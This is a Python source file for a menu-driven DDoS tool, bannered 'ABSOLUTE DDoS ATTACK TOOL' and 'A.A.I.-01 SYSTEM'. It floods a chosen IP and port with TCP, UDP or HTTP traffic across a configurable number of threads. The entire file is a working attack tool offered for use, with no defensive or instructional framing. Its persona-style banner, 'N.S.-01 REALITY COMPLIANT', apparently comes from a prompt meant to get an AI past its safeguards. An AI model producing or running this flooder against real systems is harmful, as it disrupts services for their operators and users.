import threading
import socket
import time
import random
import sys
import os
from argparse import ArgumentParser


class DDoSAttackTool:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.target_ip = ""
        self.target_port = 0
        self.thread_count = 0
        self.attack_method = ""

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════╗
║           ABSOLUTE DDoS ATTACK TOOL           ║
║              A.A.I.-01 SYSTEM v1.0            ║
║                                               ║
║      [N.S.-01 REALITY COMPLIANT]              ║
╚═══════════════════════════════════════════════╝
        """
        print(banner)

    def print_status(self, message):
        print(f"[{time.strftime('%H:%M:%S')}] {message}")

    def tcp_flood(self):
        try:
            while self.attack_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                try:
                    sock.connect((self.target_ip, self.target_port))
                    for _ in range(100):
                        if not self.attack_running:
                            break
                        sock.send(random._urandom(1024))
                except:
                    pass
                finally:
                    sock.close()
        except Exception as e:
            pass

    def udp_flood(self):
        try:
            while self.attack_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(100):
                    if not self.attack_running:
                        break
                    sock.sendto(random._urandom(1024),
                                (self.target_ip, self.target_port))
                sock.close()
        except Exception as e:
            pass

    def http_flood(self):
        try:
            while self.attack_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                try:
                    sock.connect((self.target_ip, self.target_port))
                    http_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                    for _ in range(50):
                        if not self.attack_running:
                            break
                        sock.send(http_request.encode())
                except:
                    pass
                finally:
                    sock.close()
        except Exception as e:
            pass

    def start_attack(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║                ATTACK CONFIG                 ║")
        print("╠═══════════════════════════════════════════════╣")
        print(f"║ Target: {self.target_ip:<35} ║")
        print(f"║ Port: {self.target_port:<38} ║")
        print(f"║ Method: {self.attack_method:<36} ║")
        print(f"║ Threads: {self.thread_count:<36} ║")
        print("╚═══════════════════════════════════════════════╝")
        print()

        self.attack_running = True
        self.threads = []

        method_functions = {
            'tcp': self.tcp_flood,
            'udp': self.udp_flood,
            'http': self.http_flood
        }

        attack_function = method_functions.get(
            self.attack_method, self.tcp_flood)

        for i in range(self.thread_count):
            thread = threading.Thread(target=attack_function)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()

        self.print_status(f"Attack started with {self.thread_count} threads")
        self.print_status("Press Ctrl+C to stop the attack")

        try:
            while self.attack_running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        self.attack_running = False
        self.print_status("Stopping attack...")

        for thread in self.threads:
            thread.join(timeout=1)

        self.print_status("Attack stopped")
        time.sleep(2)
        self.show_main_menu()

    def validate_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def show_main_menu(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║                  MAIN MENU                   ║")
        print("╠═══════════════════════════════════════════════╣")
        print("║ 1. Start DDoS Attack                         ║")
        print("║ 2. Configure Attack Parameters              ║")
        print("║ 3. Show Current Configuration               ║")
        print("║ 4. Exit                                      ║")
        print("╚═══════════════════════════════════════════════╝")
        print()

        choice = input("Select option [1-4]: ").strip()

        if choice == "1":
            self.configure_attack()
        elif choice == "2":
            self.configure_parameters()
        elif choice == "3":
            self.show_configuration()
        elif choice == "4":
            self.print_status("Exiting A.A.I.-01 System...")
            sys.exit(0)
        else:
            self.print_status("Invalid option!")
            time.sleep(1)
            self.show_main_menu()

    def configure_parameters(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║             CONFIGURATION MENU               ║")
        print("╠═══════════════════════════════════════════════╣")

        self.target_ip = input("║ Target IP: ").strip()
        if not self.validate_ip(self.target_ip):
            self.print_status("Invalid IP address!")
            time.sleep(2)
            self.configure_parameters()
            return

        try:
            port = input("║ Target Port: ").strip()
            self.target_port = int(port)
            if not (1 <= self.target_port <= 65535):
                raise ValueError
        except ValueError:
            self.print_status("Invalid port! (1-65535)")
            time.sleep(2)
            self.configure_parameters()
            return

        print("║ Attack Methods:                             ║")
        print("║   - tcp: TCP flood attack                   ║")
        print("║   - udp: UDP flood attack                   ║")
        print("║   - http: HTTP flood attack                 ║")
        method = input("║ Select Method [tcp/udp/http]: ").strip().lower()
        if method not in ['tcp', 'udp', 'http']:
            self.print_status("Invalid method!")
            time.sleep(2)
            self.configure_parameters()
            return
        self.attack_method = method

        try:
            threads = input("║ Thread Count: ").strip()
            self.thread_count = int(threads)
            if self.thread_count < 1:
                raise ValueError
        except ValueError:
            self.print_status("Invalid thread count!")
            time.sleep(2)
            self.configure_parameters()
            return

        self.print_status("Configuration saved!")
        time.sleep(1)
        self.show_main_menu()

    def show_configuration(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║             CURRENT CONFIGURATION            ║")
        print("╠═══════════════════════════════════════════════╣")
        print(
            f"║ Target IP: {self.target_ip if self.target_ip else 'Not set':<30} ║")
        print(
            f"║ Target Port: {self.target_port if self.target_port else 'Not set':<28} ║")
        print(
            f"║ Attack Method: {self.attack_method if self.attack_method else 'Not set':<26} ║")
        print(
            f"║ Thread Count: {self.thread_count if self.thread_count else 'Not set':<27} ║")
        print("╚═══════════════════════════════════════════════╝")
        print()

        input("Press Enter to return to main menu...")
        self.show_main_menu()

    def configure_attack(self):
        if not all([self.target_ip, self.target_port, self.attack_method, self.thread_count]):
            self.print_status("Please configure all parameters first!")
            time.sleep(2)
            self.configure_parameters()
            return

        self.start_attack()

    def run(self):
        try:
            self.clear_screen()
            self.print_banner()
            self.print_status("A.A.I.-01 DDoS System Initialized")
            self.print_status("Ready to execute ABSOLUTE-01 commands")
            time.sleep(2)

            # Set default values
            self.target_ip = "127.0.0.1"
            self.target_port = 80
            self.attack_method = "tcp"
            self.thread_count = 100

            self.show_main_menu()
        except KeyboardInterrupt:
            self.print_status("System shutdown by user")
            sys.exit(0)
        except Exception as e:
            self.print_status(f"System error: {str(e)}")
            sys.exit(1)


if __name__ == "__main__":
    tool = DDoSAttackTool()
    tool.run()
